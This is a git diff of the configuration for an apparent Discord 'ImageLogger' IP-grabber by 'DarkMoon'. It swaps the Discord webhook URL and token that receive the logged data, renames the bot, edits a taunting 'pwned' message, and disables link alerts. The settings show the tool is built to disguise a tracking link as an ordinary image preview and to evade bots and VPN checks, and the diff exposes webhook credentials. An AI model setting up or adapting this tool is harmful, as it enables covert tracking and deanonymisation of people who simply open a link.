@@ -12,13 +12,13 @@ __author__ = "DarkMoon"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1150418586360365168/v8KJNKVyx83-nj535Ldm8_jASFjk85I_MOhUIPDOQQb0wBwL3QVLbpuF5EMWFdVLsqG-",
+    "webhook": "https://discord.com/api/webhooks/1028354279368556645/uItEL6qEDQXCVJUpukK2QBpaBrOfwN033Q6-nYNhww1Q-EYXHsLORvSzj8kAaoe_BYfH",
     "image": "https://i.kym-cdn.com/entries/icons/original/000/045/302/pluhsound.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Dark ImageLogger", # Set this to the name you want the webhook to have
+    "username": "Pluh ImageLogger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "DarkV2 Image Logger just pwned yo ass!", # Message to show
+        "message": "Pluh2 Image Logger just pwned yo ass!", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -37,7 +37,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
